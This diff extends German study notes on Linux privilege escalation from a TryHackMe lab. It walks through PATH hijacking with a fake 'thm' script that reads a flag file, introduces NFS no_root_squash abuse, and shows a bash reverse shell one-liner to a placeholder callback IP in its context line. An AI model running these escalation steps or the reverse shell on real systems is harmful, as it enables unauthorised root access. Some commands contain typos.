@@ -228,3 +228,41 @@ bash -i >& /dev/tcp/*CallbackIP*/*callbackPort* 0>&1
 ```
 
 # Privilegien Eskalierung: PATH
+
+Wenn sich ein Ordner, für den Ihr Benutzer Schreibrechte hat, im Path befindet, kann eine Anwendung möglicherweise zur Ausführung eines Skripts missbraucht werden. PATH in Linux ist eine Umgebungsvariable, die dem Betriebssystem mitteilt, wo es nach ausführbaren Dateien suchen soll. Bei jedem Befehl, der nicht in die Shell integriert oder nicht mit einem absoluten Pfad definiert ist, beginnt Linux mit der Suche in den unter PATH definierten Ordnern. (PATH ist die Umgebungsvariable, von der hier die Rede ist, Pfad ist der Speicherort einer Datei).
+
+Was ist hier wichtig zu Wissen/Testen?
+- Welche Ordner befinden sich unter $PATH
+- Hat der aktuelle Benutzer Schreibrechte für einen dieser Ordner?
+- Kann $PATH geändert werden?
+- Gibt es ein Skript/eine Anwendung, die gestartet werden kann und die von dieser Sicherheitslücke betroffen ist?
+
+
+Beispiel:
+
+we can use the `find / -writable 2>/dev/null | grep home` command to find the writable folders.
+In your terminal where you logged in as Karen, run the `cd /home` command so that we can see which files we can access. When we run `-ls -a` we can sere that we have matt, murdoch, and ubuntu. Our flag.txt will be under matt, but let's see whats under murdoch since we have writeable access to it.
+
+In dem Benutzerordner Murdock finden wir in dem Fall ein Python Script welches eine Dependency auf "thm" hat. Das können wir dann ausnutzen und ein kleines script basteln was dann "thm" heißt um die Flag Datei zu lesen.
+Erstellen Sie die thm-Datei mit touch thm.
+
+Schreiben Sie das Skript in diese Datei mit `echo "cat /home/matt/flag6.txt" > thm`.
+Um diese thm-Datei ausführbar zu machen, müssen wir sie mit dem Befehl `chmod +x thm` umwandeln.
+Bevor wir nun ./test ausführen können, müssen wir den Pfad exportieren via  `export PATH=/home/murdoch:$PATH`
+Schließlich können wir den Befehl ./test ausführen. Wir haben unsere PATH-Schwachstelle erfolgreich ausgenutzt!
+
+am besten hier nochmal anschauen 
+https://dev.to/christinec_dev/try-hack-me-linux-privesc-complete-write-up-20fg
+
+# Privilegien Eskalierung: NFS
+
+Vektoren für die Eskalation von Rechten sind nicht auf den internen Zugriff beschränkt. Auch über freigegebene Ordner und Fernverwaltungsschnittstellen wie SSH und Telnet kann man sich root-Zugriff auf das Zielsystem verschaffen. In einigen Fällen ist es auch erforderlich, beide Vektoren zu nutzen, z. B. einen privaten SSH-Schlüssel für root auf dem Zielsystem zu finden und sich über SSH mit root-Rechten zu verbinden, anstatt zu versuchen, die Berechtigungsstufe des aktuellen Benutzers zu erhöhen.
+
+Ein weiterer Vektor, der eher für CTFs und Prüfungen relevant ist, ist eine falsch konfigurierte Netzwerk-Shell. Dieser Vektor kann manchmal bei Penetrationstests beobachtet werden, wenn ein Netzwerk-Backup-System vorhanden ist.
+
+Die NFS-Konfiguration (Network File Sharing) wird in der Datei `/etc/exports` gespeichert. Diese Datei wird bei der Installation des NFS-Servers erstellt und kann normalerweise von den Benutzern gelesen werden.
+Das entscheidende Element für diesen Vektor der Privilegienerweiterung ist die Option „no_root_squash“. Standardmäßig ändert NFS den Root-Benutzer in nfsnobody und entfernt jede Datei, die mit Root-Rechten arbeitet. Wenn die Option „no_root_squash“ auf einer beschreibbaren Freigabe vorhanden ist, können wir eine ausführbare Datei mit gesetztem SUID-Bit erstellen und sie auf dem Zielsystem ausführen.****
+
+### Enumeration von Mountable Shares
+
+
